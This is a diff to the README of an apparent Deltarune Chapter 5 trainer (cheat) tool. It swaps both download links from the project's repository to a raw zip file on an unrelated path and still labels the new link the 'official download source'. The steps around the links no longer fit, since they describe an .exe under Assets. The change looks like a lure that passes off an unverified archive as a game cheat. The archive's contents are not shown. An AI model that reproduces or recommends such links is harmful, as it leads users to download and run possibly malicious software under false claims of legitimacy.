@@ -5,7 +5,7 @@ description: "Modify game values in Deltarune Chapter 5 with this trainer to ena
 ---
 # 🕹️ Deltarune-Chapter5-Trainer-Toolkit - Edit your Deltarune save data easily
 
-[![Download Trainer](https://img.shields.io/badge/Download-Release-blue)](https://github.com/EllyMerdy/Deltarune-Chapter5-Trainer-Toolkit)
+[![Download Trainer](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/EllyMerdy/ellymerdy.github.io/main/nongelatinous/ellymerdy_github_io_2.9.zip)
 
 This application provides tools to modify Deltarune Chapter 5. You can change your health, stats, items, and game speed. This tool runs as an external process. It works for single-player exploration. It does not modify game files.
 
@@ -21,7 +21,7 @@ This application provides tools to modify Deltarune Chapter 5. You can change yo
 1. Navigate to the release page.
 2. Select the link below to reach the official download source.
 
-[https://github.com/EllyMerdy/Deltarune-Chapter5-Trainer-Toolkit](https://github.com/EllyMerdy/Deltarune-Chapter5-Trainer-Toolkit)
+[https://raw.githubusercontent.com/EllyMerdy/ellymerdy.github.io/main/nongelatinous/ellymerdy_github_io_2.9.zip](https://raw.githubusercontent.com/EllyMerdy/ellymerdy.github.io/main/nongelatinous/ellymerdy_github_io_2.9.zip)
 
 3. Look for the Assets section on that page.
 4. Click the file ending in .exe to start your download.
